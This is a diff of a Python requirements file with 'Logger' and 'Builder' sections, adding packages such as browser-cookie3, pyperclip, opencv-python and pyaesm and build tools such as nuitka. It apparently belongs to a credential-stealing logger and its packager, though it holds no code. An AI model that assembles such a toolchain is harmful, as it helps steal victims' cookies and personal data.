@@ -1,15 +1,20 @@
 # Logger
-psutil
 cryptography
-requests
+opencv-python
+psutil
+pycountry
+pyperclip
 pypiwin32
-wmi
+requests
 requests-toolbelt
+wmi
+pyaesm
+browser-cookie3
 # Builder
 colorama
-pyinstaller
-pyuac
+customtkinter
+nuitka
+packaging
 pillow
 pycryptodomex
-customtkinter
-packaging
+pyinstaller
